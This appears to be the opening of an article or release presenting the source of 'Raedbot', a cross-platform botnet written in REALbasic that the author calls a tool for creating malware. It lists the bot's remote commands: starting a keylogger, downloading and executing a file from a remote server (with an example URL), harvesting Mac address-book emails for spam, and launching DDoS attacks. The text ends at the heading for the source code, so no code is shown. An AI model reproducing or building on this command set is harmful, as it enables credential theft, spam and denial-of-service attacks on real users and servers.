// Coded for the first time in REALbasic 
// Projects can be compiled in 3 different OS : Win32
                                                 Mac OS X  
                                                 Linux  
     
 
  // REALbasic is a cross-platform software development environment for creating software for Mac, Windows and Linux.
    Right now it is a software for creating malwares !
    to start , this is an article explaining the Raedbot botnet source code and its mechanism ,
    the compiled file can run in 3 different OS ( Win32 , Linux and Mac OS X ) , see built_image
    and we can say that is the first Mac OS X Botnet 

 

Commands are :

talk phrase : Prounounce text with  computer’s speech synthesizer  ( Win32 and Mac OS only ) , exemple : talk bsili

beep : Beep !

log.start : Start keylogger

log.stop : Stop keylogger

update url : Download file from remote http server and execute it , exemple : update http:\\myserver.tn\myfile.app

navigate url : Open a site with the default machine navigator , exemple : navigate www.tounes_bi5air.tn

spam.on : Get Mac os address book emails and spam them ( Only Mac OS X )

spam.off : Stop spamming

ddos.on ; Start ddos attacke on remote http target

ddos.off ! Stop the ddos attacke
 
===== > source Code ,
